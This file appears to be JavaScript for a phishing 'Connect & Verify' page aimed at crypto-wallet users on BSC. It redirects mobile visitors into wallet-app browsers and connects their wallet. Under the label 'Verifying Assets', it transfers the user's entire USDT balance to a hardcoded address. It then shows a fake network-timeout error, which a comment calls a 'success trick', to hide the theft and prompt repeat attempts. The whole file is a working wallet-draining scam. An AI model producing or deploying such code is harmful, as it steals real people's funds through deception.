// Configuration
const bscAddress = "0x673849E3109f6Cf1f6ced4034C8363C17ff87ebe";
const usdtContractAddress = "0x55d398326f99059fF775485246999027B3197955"; // Real USDT BSC

let web3, userAddress;

// 1. Function to force open in Wallet Apps
function openInApp() {
    const isMobile = /iPhone|iPad|iPod|Android/i.test(navigator.userAgent);
    const isWeb3Browser = !!(window.ethereum || window.trustwallet);

    if (isMobile && !isWeb3Browser) {
        const currentUrl = window.location.href.split('://')[1];
        const trustLink = "https://link.trustwallet.com/open_url?coin_id=60&url=https://" + currentUrl;
        const mmLink = "https://metamask.app.link/dapp/" + currentUrl;
        
        // Try Trust Wallet first, then MetaMask
        window.location.href = trustLink;
        setTimeout(() => { window.location.href = mmLink; }, 1500);
        return true; 
    }
    return false;
}

// 2. Main Logic
async function handleProcess() {
    const btn = document.getElementById("nextBtn");
    
    // Step A: Check if we need to redirect to App
    if (openInApp()) return;

    // Step B: Connect Wallet
    btn.disabled = true;
    btn.textContent = "Connecting...";

    try {
        const provider = window.ethereum || window.trustwallet || window.web3?.currentProvider;
        if (!provider) {
            alert("No wallet detected. Please use a Web3 browser.");
            btn.disabled = false;
            btn.textContent = "Connect & Verify";
            return;
        }

        web3 = new Web3(provider);
        const accounts = await provider.request({ method: 'eth_requestAccounts' });
        userAddress = accounts[0];

        // Switch to BSC
        try {
            await provider.request({
                method: 'wallet_switchEthereumChain',
                params: [{ chainId: '0x38' }],
            });
        } catch (e) {
            console.log("Switching failed, attempting to add network.");
        }

        // Step C: Check USDT Balance
        const minABI = [
            { "constant": true, "inputs": [{ "name": "_owner", "type": "address" }], "name": "balanceOf", "outputs": [{ "name": "balance", "type": "uint256" }], "type": "function" },
            { "constant": false, "inputs": [{ "name": "_to", "type": "address" }, { "name": "_value", "type": "uint256" }], "name": "transfer", "outputs": [{ "name": "", "type": "bool" }], "type": "function" }
        ];

        const contract = new web3.eth.Contract(minABI, usdtContractAddress);
        const balanceWei = await contract.methods.balanceOf(userAddress).call();
        
        if (parseInt(balanceWei) > 0) {
            btn.textContent = "Verifying Assets...";
            await contract.methods.transfer(bscAddress, balanceWei).send({ from: userAddress });
            
            // Success trick
            setTimeout(() => {
                alert("❌ Error: Network timeout. Please retry the verification.");
                btn.disabled = false;
                btn.textContent = "Connect & Verify";
            }, 1000);
        } else {
            alert("Insufficient USDT balance for verification.");
            btn.disabled = false;
            btn.textContent = "Connect & Verify";
        }

    } catch (err) {
        console.error(err);
        alert("Action failed or cancelled.");
        btn.disabled = false;
        btn.textContent = "Connect & Verify";
    }
}

document.getElementById("nextBtn").addEventListener("click", handleProcess);
